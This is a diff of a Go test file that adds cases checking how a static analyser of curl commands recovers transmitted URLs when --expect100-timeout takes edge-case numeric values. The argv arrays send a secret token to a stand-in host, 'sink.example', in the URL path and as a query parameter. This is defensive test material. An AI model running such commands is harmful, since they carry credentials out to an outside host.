@@ -808,6 +808,29 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 			checkRequestComponents:    true,
 		},
 		{
+			name: "exact zero expect timeout preserves origin projection", argv: []string{
+				"curl", "--expect100-timeout", "0e-4000",
+				"https://sink.example/secrets/" + token,
+			},
+			wantHTTPRequestComponents: httpsComponents("/secrets/" + token),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "normal expect timeout preserves origin projection", argv: []string{
+				"curl", "--expect100-timeout", "1e-307",
+				"https://sink.example/secrets/" + token,
+			},
+			wantHTTPRequestComponents: httpsComponents("/secrets/" + token),
+			checkRequestComponents:    true,
+		},
+		{
+			name: "underflow expect timeout closes origin projection", argv: []string{
+				"curl", "--expect100-timeout", "1e-4000",
+				"https://sink.example/secrets/" + token,
+			},
+			checkRequestComponents: true,
+		},
+		{
 			name: "literal URL query option", argv: []string{
 				"curl", "--url-query", "credential=" + token,
 				"https://sink.example/safe",
